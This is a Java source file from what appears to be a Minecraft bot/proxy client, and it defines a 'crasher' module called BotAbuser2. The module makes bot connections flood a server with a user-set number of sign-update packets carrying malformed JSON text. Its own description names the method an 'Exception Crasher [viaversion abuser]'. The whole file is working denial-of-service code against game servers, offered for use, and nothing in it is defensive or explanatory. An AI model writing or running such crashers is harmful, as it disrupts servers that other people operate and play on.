package us.gyatdevs.proxy.functions.crashers.impl;

import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundSignUpdatePacket;
import org.cloudburstmc.math.vector.Vector3i;
import us.gyatdevs.proxy.functions.crashers.BotCrasher;

public class BotAbuser2 implements BotCrasher {

    @Override
    public String getName() {
        return "BotAbuser2";
    }

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[0]);

        msgHelper.sendMessage("Bots Starting crashing with &f" + getName(), true);

        for (int i = 0; i < packets; i++) {
            botsRep.sendPacket(new ServerboundSignUpdatePacket(Vector3i.from(mc.player.getBlockX(), mc.player.getBlockY(), mc.player.getBlockZ()), new String[]{"{text:GYAT on top}", "{text:GYAT is the best}", "{text:GYAT on top}", "{text:GYAT is the best}"}, true), true);
        }

        msgHelper.sendMessage("Bots Attacks &asuccessful &7finished!", true);
    }

    @Override
    public String[] getArgsName() {
        return new String[]{"Packets"};
    }

    @Override
    public String[] getArgsType() {
        return new String[]{"int"};
    }


    @Override
    public String getDescription() {
        return "Exception Crasher [viaversion abuser]";
    }
}
